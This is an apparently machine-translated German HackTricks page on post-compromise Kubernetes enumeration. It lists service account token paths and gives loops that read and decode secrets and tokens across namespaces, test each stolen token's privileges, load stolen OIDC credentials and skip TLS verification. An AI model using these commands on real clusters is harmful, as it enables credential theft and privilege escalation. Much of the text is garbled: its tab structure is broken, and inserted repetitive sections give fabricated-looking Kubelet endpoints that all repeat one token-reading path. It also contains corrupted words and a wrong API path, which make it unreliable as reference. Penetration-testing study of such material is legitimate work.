# Kubernetes Enumeration

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Kubernetes Tokens

Wenn Sie Zugriff auf eine Maschine kompromittiert haben, hat der Benutzer m√∂glicherweise Zugriff auf eine Kubernetes-Plattform. Der Token befindet sich normalerweise in einer Datei, auf die die **Umgebungsvariable `KUBECONFIG`** oder **innerhalb von `~/.kube`** verweist.

In diesem Ordner finden Sie Konfigurationsdateien mit **Tokens und Konfigurationen zum Verbinden mit dem API-Server**. In diesem Ordner finden Sie auch einen Cache-Ordner mit zuvor abgerufenen Informationen.

Wenn Sie einen Pod innerhalb einer Kubernetes-Umgebung kompromittiert haben, gibt es andere Orte, an denen Sie Tokens und Informationen zur aktuellen K8-Umgebung finden k√∂nnen:

### Service Account Tokens

Bevor Sie fortfahren, wenn Sie nicht wissen, was ein Dienst in Kubernetes ist, w√ºrde ich Ihnen empfehlen, **diesen Link zu folgen und zumindest die Informationen zur Kubernetes-Architektur zu lesen**.

Entnommen aus der Kubernetes-[Dokumentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚ÄûWenn Sie einen Pod erstellen und keinen Dienstaccount angeben, wird ihm automatisch der_ Standard _Dienstaccount im selben Namespace zugewiesen.‚Äú_

**ServiceAccount** ist ein von Kubernetes verwaltetes Objekt, das dazu dient, eine Identit√§t f√ºr Prozesse bereitzustellen, die in einem Pod ausgef√ºhrt werden.\
Jeder Dienstaccount hat ein damit verbundenes Geheimnis, und dieses Geheimnis enth√§lt ein B√§ren-Token. Dies ist ein JSON-Web-Token (JWT), eine Methode zur sicheren Darstellung von Anspr√ºchen zwischen zwei Parteien.

Normalerweise befinden sich **einer** der Verzeichnisse:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

die Dateien:

* **ca.crt**: Es ist das CA-Zertifikat zur √úberpr√ºfung von Kubernetes-Kommunikationen
* **namespace**: Es zeigt den aktuellen Namespace an
* **token**: Es enth√§lt das **Dienst-Token** des aktuellen Pods.

Nun, da Sie den Token haben, k√∂nnen Sie den API-Server in der Umgebungsvariable **`KUBECONFIG`** finden. F√ºr weitere Informationen f√ºhren Sie `(env | set) | grep -i "kuber|kube`**`"`** aus.

Das Dienstkontotoken wird vom im **sa.key**-Datei befindlichen Schl√ºssel signiert und von **sa.pub** validiert.

Standardm√§√üiger Speicherort auf **Kubernetes**:

* /etc/kubernetes/pki

Standardm√§√üiger Speicherort auf **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot Pods sind**_ Pods, die ein privilegiertes Dienstkontotoken enthalten. Ein privilegiertes Dienstkontotoken ist ein Token, das Berechtigungen f√ºr privilegierte Aufgaben wie das Auflisten von Geheimnissen, das Erstellen von Pods usw. hat.

## RBAC

Wenn Sie nicht wissen, was **RBAC** ist, **lesen Sie diesen Abschnitt**.

## Enumeration CheatSheet

Um eine K8s-Umgebung aufzulisten, ben√∂tigen Sie Folgendes:

* Einen **g√ºltigen Authentifizierungstoken**. Im vorherigen Abschnitt haben wir gesehen, wo nach einem Benutzertoken und einem Dienstkontotoken gesucht werden kann.
* Die **Adresse (**_**https://host:port**_**) des Kubernetes-API**. Diese kann normalerweise in den Umgebungsvariablen und/oder in der kube-Konfigurationsdatei gefunden werden.
* **Optional**: Das **ca.crt zur √úberpr√ºfung des API-Servers**. Dies kann an denselben Stellen gefunden werden, an denen sich der Token befindet. Dies ist n√ºtzlich, um das Zertifikat des API-Servers zu √ºberpr√ºfen, aber wenn Sie `--insecure-skip-tls-verify` mit `kubectl` oder `-k` mit `curl` verwenden, ben√∂tigen Sie dies nicht.

Mit diesen Details k√∂nnen Sie **Kubernetes aufz√§hlen**. Wenn der **API-Server aus irgendeinem Grund √ºber das Internet zug√§nglich ist**, k√∂nnen Sie einfach diese Informationen herunterladen und die Plattform von Ihrem Host aus aufz√§hlen.

Normalerweise befindet sich der **API-Server jedoch in einem internen Netzwerk**, daher m√ºssen Sie eine Verbindung durch die kompromittierte Maschine herstellen, um von Ihrem Ger√§t aus darauf zuzugreifen, oder Sie k√∂nnen das [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)-Bin√§rprogramm hochladen oder `curl/wget/anything` verwenden, um Roh-HTTP-Anfragen an den API-Server zu senden.

### Unterschiede zwischen den Verben `list` und `get`

Mit **`get`**-Berechtigungen k√∂nnen Sie Informationen zu bestimmten Assets abrufen (_`describe`-Option in `kubectl`_).
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Wenn Sie die **`list`** Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um einen Typ von Verm√∂genswerten aufzulisten (_`get` Option in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Wenn Sie die **`watch`** Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um Assets zu √ºberwachen:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Sie √∂ffnen eine Streaming-Verbindung, die Ihnen das vollst√§ndige Manifest eines Deployments zur√ºckgibt, wann immer es sich √§ndert (oder wenn ein neues erstellt wird).

{% hint style="danger" %}
Die folgenden `kubectl`-Befehle zeigen nur, wie man die Objekte auflistet. Wenn Sie auf die Daten zugreifen m√∂chten, m√ºssen Sie anstelle von `get` `describe` verwenden.
{% endhint %}

### Mit curl

Von innerhalb eines Pods aus k√∂nnen Sie mehrere Umgebungsvariablen verwenden:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Standardm√§√üig kann das Pod auf den **kube-api Server** unter dem Dom√§nennamen **`kubernetes.default.svc`** zugreifen und Sie k√∂nnen das kube-Netzwerk in **`/etc/resolv.config`** sehen, da Sie hier die Adresse des Kubernetes-DNS-Servers finden (die ".1" des gleichen Bereichs ist der kube-api-Endpunkt).
{% endhint %}

### Verwendung von kubectl

Nachdem Sie das Token und die Adresse des API-Servers haben, verwenden Sie kubectl oder curl, um darauf zuzugreifen, wie hier angegeben:

Standardm√§√üig kommuniziert der APISERVER mit dem `https://`-Schema
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> Wenn keine `https://` in der URL vorhanden ist, k√∂nnen Sie einen Fehler wie Bad Request erhalten.

Sie k√∂nnen hier ein [**offizielles kubectl Spickzettel finden**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Das Ziel der folgenden Abschnitte ist es, verschiedene Optionen in geordneter Weise darzustellen, um das neue K8s, auf das Sie Zugriff erhalten haben, zu enumerieren und zu verstehen.

Um den HTTP-Request zu finden, den `kubectl` sendet, k√∂nnen Sie den Parameter `-v=8` verwenden.

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktuelle Konfiguration

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Wenn es Ihnen gelungen ist, einige Benutzeranmeldeinformationen zu stehlen, k√∂nnen Sie **sie lokal konfigurieren**, indem Sie etwas √Ñhnliches verwenden:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Unterst√ºtzte Ressourcen abrufen

Mit diesen Informationen kennen Sie alle Dienste, die Sie auflisten k√∂nnen

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Aktuelle Berechtigungen erhalten

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

1. **List all Service Accounts in all Namespaces:**

```bash
kubectl get serviceaccounts --all-namespaces
```

2. **List all Service Accounts Tokens in all Namespaces:**

```bash
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do kubectl get serviceaccounts --namespace $ns -o jsonpath='{.items[*].secrets[*].name}{"\n"}' 2>/dev/null | xargs -I{} kubectl get secret {} --namespace $ns -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null; done
```

3. **List all Service Accounts Tokens in a specific Namespace:**

```bash
for secret in $(kubectl get serviceaccounts --namespace <NAMESPACE> -o jsonpath='{.items[*].sesecrets[*].name}'); do kubectl get secret $secret --namespace <NAMESPACE> -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null; done
```

4. **List all Service Accounts Tokens in all Namespaces (using kubectl-who-can):**

```bash
kubectl-who-can get secrets --all-namespaces | grep -i serviceaccounttoken | awk '{print $1}' | xargs -I{} kubectl get secret {} -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null
```

#### Pods

1. **List all Pods in all Namespaces:**

```bash
kubectl get pods --all-namespaces
```

2. **List all Pods with associated Service Account Tokens in all Namespaces:**

```bash
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do kubectl get pods --namespace $ns -o jsonpath='{.items[*].metadata.name}{"\n"}' 2>/dev/null | xargs -I{} kubectl get pod {} --namespace $ns -o jsonpath='{.spec.serviceAccountName}{"\n"}' | xargs -I{} kubectl get secret {} --namespace $ns -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null; done
```

3. **List all Pods with associated Service Account Tokens in a specific Namespace:**

```bash
for pod in $(kubectl get pods --namespace <NAMESPACE> -o jsonpath='{.items[*].metadata.name}'); do k_pod=$(kubectl get pod $pod --namespace <NAMESPACE> -o jsonpath='{.spec.serviceAccountName}{"\n"}'); kubectl get secret $(kubectl get serviceaccount $k_pod --namespace <NAMESPACE> -o jsonpath='{.secrets[*].name}') --namespace <NAMESPACE> -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null; done
```

4. **List all Pods with associated Service Account Tokens in all Namespaces (using kubectl-who-can):**

```bash
kubectl-who-can get secrets --all-namespaces | grep -i serviceaccounttoken | awk '{print $1}' | xargs -I{} kubectl get secret {} -o jsonpath='{.data.token}{"\n"}' | base64 -d 2>/dev/null
```

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Eine weitere M√∂glichkeit, Ihre Berechtigungen zu √ºberpr√ºfen, ist die Verwendung des Tools: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Weitere Informationen zu **Kubernetes RBAC** finden Sie unter:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Sobald Sie wissen, welche Berechtigungen** Sie haben, √ºberpr√ºfen Sie die folgende Seite, um herauszufinden, **ob Sie sie missbrauchen k√∂nnen**, um Berechtigungen zu eskalieren:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Erhalten Sie andere Rollen

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

1. **List all service accounts in the cluster:**

   ```bash
   kubectl get serviceaccounts --all-namespaces
   ```

2. **Get detailed information about a specific service account:**

   ```bash
   kubectl describe serviceaccount <service-account-name> -n <namespace>
   ```

3. **List all service account tokens in the cluster:**

   ```bash
   kubectl get secrets --all-namespaces | grep service-account-token
   ```

4. **Decode a service account token:**

   ```bash
   echo "<token>" | base64 -d
   ```

#### Pods

1. **List all pods in the cluster:**

   ```bash
   kubectl get pods --all-namespaces
   ```

2. **Get detailed information about a specific pod:**

   ```bash
   kubectl describe pod <pod-name> -n <namespace>
   ```

3. **List all environment variables in a pod:**

   ```bash
   kubectl exec <pod-name> -n <namespace> -- printenv
   ```

4. **Access the pod's shell:**

   ```bash
   kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
   ```

#### Nodes

1. **List all nodes in the cluster:**

   ```bash
   kubectl get nodes
   ```

2. **Get detailed information about a specific node:**

   ```bash
   kubectl describe node <node-name>
   ```

3. **List all pods running on a specific node:**

   ```bashjson
   kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.nodeName=="<node-name>")'
   ```

#### RBAC

1. **List all roles in the cluster:**

   ```bash
   kubectl get roles --all-namespaces
   ```

2. **List all role bindings in the cluster:**

   ```bash
   kubectl get rolebindings --all-namespaces
   ```

3. **List all cluster roles in the cluster:**

   ```bash
   kubectl get clusterroles
   ```

4. **List all cluster role bindings in the cluster:**

   ```bash
   kubectl get clusterrolebindings
   ```

#### Network Policies

1. **List all network policies in the cluster:**

   ```bash
   kubectl get networkpolicies --all-namespaces
   ```

2. **Get detailed information about a specific network policy:**

   ```bash
   kubectl describe networkpolicy <network-policy-name> -n <namespace>
   ```

#### Storage Classes

1. **List all storage classes in the cluster:**

   ```bash
   kubectl get storageclasses
   ```

2. **Get detailed information about a specific storage class:**

   ```bash
   kubectl describe storageclass <storage-class-name>
   ```

#### Persistent Volumes

1. **List all persistent volumes in the cluster:**

   ```bash
   kubectl get persistentvolumes
   ```

2. **Get detailed information about a specific persistent volume:**

   ```bash
   kubectl describe persistentvolume <persistent-volume-name>
   ```

#### Secrets

1. **List all secrets in the cluster:**

   ```bash
   kubectl get secrets --all-namespaces
   ```

2. **Get detailed information about a specific secret:**

   ```bash
   kubectl describe secret <secret-name> -n <namespace>
   ```

3. **Decode a secret:**

   ```bash
   echo "<secret>" | base64 -d
   ```

#### Config Maps

1. **List all config maps in the cluster:**

   ```bash
   kubectl get configmaps --all-namespaces
   ```

2. **Get detailed information about a specific config map:**

   ```bash
   kubectl describe configmap <config-map-name> -n <namespace>
   ```

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### Erhalte Namespaces

Kubernetes unterst√ºtzt **mehrere virtuelle Cluster**, die vom selben physischen Cluster unterst√ºtzt werden. Diese virtuellen Cluster werden **Namespaces** genannt.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Geheime Informationen erhalten

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

- **API-Server**: `https://<k8s-apiserver>/api/v1/namespaces/<namespace>/serviceaccounts`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/ls /var/run/secrets/kubernetes.io/serviceaccount`

#### Secrets

- **API-Server**: `https://<k8s-apiserver>/api/v1/namespaces/<namespace>/secrets`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### ConfigMaps

- **API-Server**: `https://<k8s-apiserver>/api/v1/namespaces/<namespace>/configmaps`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Pods

- **API-Server**: `https://<k8s-apiserver>/api/v1/namespaces/<namespace>/pods`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Persistent Volumes

- **API-Server**: `https://<k8s-apiserver>/api/v1/persistentvolumes`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### RBAC

- **API-Server**: `https://<k8s-apiserver>/apis/rbac.authorization.k8s.io/v1/clusterroles`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Nodes

- **API-Server**: `https://<k8s-apiserver>/api/v1/nodes`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Network Policies

- **API-Server**: `https://<k8s-apiserver>/apis/networking.k8s.io/v1/networkpolicies`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Storage Classes

- **API-Server**: `https://<k8s-apiserver>/apis/storage.k8s.io/v1/storageclasses`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Events

- **API-Server**: `https://<k8s-apiserver>/api/v1/events`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Limit Ranges

- **API-Server**: `https://<k8s-apiserver>/api/v1/namespaces/<namespace>/limitranges`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`

#### Ingresses

- **API-Server**: `https://<k8s-apiserver>/apis/networking.k8s.io/v1/ingresses`
- **Kubelet**: `https://<k8s-kubelet>/pods/<pod-name>/exec/<container-name>/cat /var/run/secrets/kubernetes.io/serviceaccount/token`
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Wenn Sie Geheimnisse lesen k√∂nnen, k√∂nnen Sie die folgenden Zeilen verwenden, um die mit jedem Token verbundenen Berechtigungen zu erhalten:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Service Accounts abrufen

Wie am Anfang dieser Seite diskutiert, wird einem Pod in der Regel ein Service Account zugewiesen, wenn er ausgef√ºhrt wird. Daher kann das Auflisten der Service Accounts, ihrer Berechtigungen und ihres Ausf√ºhrungsorts einem Benutzer erm√∂glichen, Berechtigungen zu eskalieren.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Erhalte Bereitstellungen

Die Bereitstellungen geben die **Komponenten** an, die **ausgef√ºhrt** werden m√ºssen.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Pods abrufen

Die Pods sind die tats√§chlichen **Container**, die **ausgef√ºhrt** werden.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

- **Beschreibung**: Service Accounts sind f√ºr die Kommunikation zwischen Pods und dem Kubernetes-API-Server verantwortlich.
- **Befehle**:
  - `kubectl get serviceaccounts --all-namespaces`
  - `kubectl get serviceaccounts default -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Berechtigungen der Service Accounts, um m√∂gliche Angriffspunkte zu identifizieren.

#### Secrets

- **Beschreibung**: Secrets speichern sensible Informationen wie Zugangsdaten, API-Keys usw.
- **Befehle**:
  - `kubectl get secrets --all-namespaces`
  - `kubectl get secrets SECRET_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie, ob sensible Informationen unverschl√ºsselt gespeichert sind.

#### ConfigMaps

- **Beschreibung**: ConfigMaps speichern Konfigurationsdaten als Key-Value-Paare.
- **Befehle**:
  - `kubectl get configmaps --all-namespaces`
  - `kubectl get configmaps CONFIGMAP_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie, ob sensible Konfigurationsdaten √∂ffentlich zug√§nglich sind.

#### Ingress Resources

- **Beschreibung**: Ingress Resources definieren den Zugriff auf Kubernetes-Services von au√üerhalb des Clusters.
- **Befehle**:
  - `kubectl get ingresses --all-namespaces`
  - `kubectl get ingresses INGRESS_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Konfiguration der Ingress Resources auf Sicherheitsl√ºcken.

#### Network Policies

- **Beschreibung**: Network Policies steuern den eingehenden und ausgehenden Netzwerkverkehr f√ºr Pods.
- **Befehle**:
  - `kubectl get networkpolicies --all-namespaces`
  - `kubectl get networkpolicies NETWORK_POLICY_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie, ob die Network Policies restriktiv genug sind, um unerw√ºnschten Netzwerkverkehr zu verhindern.

#### Persistent Volumes

- **Beschreibung**: Persistent Volumes sind Speicherbereiche, die von Pods genutzt werden k√∂nnen.
- **Befehle**:
  - `kubectl get persistentvolumes`
  - `kubectl get persistentvolumeclaims --all-namespaces`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Berechtigungen und Zugriffsrechte f√ºr Persistent Volumes.

#### Roles und Role Bindings

- **Beschreibung**: Roles definieren, welche Aktionen ein Benutzer innerhalb eines Namespaces ausf√ºhren kann, w√§hrend Role Bindings Benutzer mit Rollen verkn√ºpfen.
- **Befehle**:
  - `kubectl get roles --all-namespaces`
  - `kubectl get rolebindings --all-namespaces`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Rollen und Role Bindings, um sicherzustellen, dass nur autorisierte Benutzer bestimmte Aktionen ausf√ºhren k√∂nnen.

#### Service Types

- **Beschreibung**: Service Types definieren, wie ein Service innerhalb des Clusters erreichbar ist (z. B. ClusterIP, NodePort, LoadBalancer).
- **Befehle**:
  - `kubectl get services --all-namespaces`
  - `kubectl get services SERVICE_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Service Types auf potenzielle Sicherheitsrisiken.

#### Pod Security Policies

- **Beschreibung**: Pod Security Policies legen fest, welche Sicherheitsrichtlinien Pods einhalten m√ºssen.
- **Befehle**:
  - `kubectl get podsecuritypolicies --all-namespaces`
  - `kubectl get podsecuritypolicies POLICY_NAME -n NAMESPACE -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Konfiguration der Pod Security Policies, um sicherzustellen, dass Pods sicher ausgef√ºhrt werden.

#### Custom Resource Definitions (CRDs)

- **Beschreibung**: CRDs erm√∂glichen die Erweiterung der Kubernetes-API.
- **Befehle**:
  - `kubectl get customresourcedefinitions.apiextensions.k8s.io`
  - `kubectl get customresourcedefinitions.apiextensions.k8s.io CRD_NAME -o yaml`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Konfiguration von CRDs auf potenzielle Sicherheitsl√ºcken.

#### RBAC

- **Beschreibung**: Role-Based Access Control (RBAC) regelt den Zugriff auf Kubernetes-Ressourcen basierend auf den zugewiesenen Rollen.
- **Befehle**:
  - `kubectl get clusterroles`
  - `kubectl get clusterrolebindings`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die RBAC-Konfiguration, um sicherzustellen, dass nur autorisierte Benutzer auf Ressourcen zugreifen k√∂nnen.

#### API-Server

- **Beschreibung**: Der API-Server ist die zentrale Schnittstelle f√ºr die Verwaltung von Kubernetes-Clustern.
- **Befehle**:
  - `kubectl cluster-info`
  - `kubectl get componentstatuses`
- **Weitere Informationen**:
  - √úberpr√ºfen Sie die Konfiguration des API-Servers auf potenzielle Sicherheitsprobleme.

#### Weitere Enumerationstechniken

- **Beschreibung**: Weitere Techniken zur Enumeration von Kubernetes-Clustern.
- **Befehle**:
  - `kubectl get pods --all-namespaces`
  - `kubectl get deployments --all-namespaces`
- **Weitere Informationen**:
  - Nutzen Sie verschiedene Befehle, um weitere Informationen √ºber den Cluster zu sammeln.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Erhalte Dienste

Kubernetes **Dienste** werden verwendet, um einen Dienst an einem bestimmten Port und einer IP-Adresse **zu ver√∂ffentlichen (die als Lastenausgleicher f√ºr die Pods fungieren, die den Dienst tats√§chlich anbieten)**. Es ist interessant zu wissen, wo Sie andere Dienste finden k√∂nnen, um versuchen zu k√∂nnen, anzugreifen.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

- **Beschreibung**: Service Accounts sind standardm√§√üig in jedem Namespace vorhanden und k√∂nnen verwendet werden, um Pods zu authentifizieren.
- **Befehle**:
  - `kubectl get serviceaccounts --all-namespaces`
  - `kubectl get serviceaccounts default -n NAMESPACE -o yaml`
- **Ergebnisse**:
  - Informationen zu vorhandenen Service Accounts
  - Geheime Token k√∂nnen in den Service Account-Dateien gefunden werden

#### Pods

- **Beschreibung**: Pods sind die kleinsten bereitstellbaren Einheiten in Kubernetes.
- **Befehle**:
  - `kubectl get pods --all-namespaces`
  - `kubectl describe pod POD_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu vorhandenen Pods
  - Umgebungsvariablen und gemountete Volumes k√∂nnen sensible Informationen enthalten

#### Cluster-Rollen und Cluster-Rollen-Bindungen

- **Beschjsonreibung**: Cluster-Rollen definieren Berechtigungen auf Cluster-Ebene, w√§hrend Cluster-Rollen-Bindungen Cluster-Rollen an Benutzer oder Service Accounts binden.
- **Befehle**:
  - `kubectl get clusterroles`
  - `kubectl get clusterrolebindings`
- **Ergebnisse**:
  - Liste der verf√ºgbaren Cluster-Rollen und deren Bindungen

#### Ingress-Ressourcen

- **Beschreibung**: Ingress-Ressourcen erm√∂glichen den Zugriff auf Dienste von au√üerhalb des Clusters.
- **Befehle**:
  - `kubectl get ingresses --all-namespaces`
  - `kubectl describe ingress INGRESS_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu vorhandenen Ingress-Ressourcen
  - Konfigurationen f√ºr den externen Zugriff auf Dienste

#### Netzwerkrichtlinien

- **Beschreibung**: Netzwerkrichtlinien legen fest, wie Pods miteinander und mit anderen Ressourcen kommunizieren k√∂nnen.
- **Befehle**:
  - `kubectl get networkpolicies --all-namespaces`
  - `kubectl describe networkpolicy NETWORK_POLICY_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den Netzwerkrichtlinien im Cluster

#### Speicher

- **Beschreibung**: Speicher kann sensible Daten enthalten und sollte entsprechend gesch√ºtzt werden.
- **Befehle**:
  - `kubectl get persistentvolumeclaims --all-namespaces`
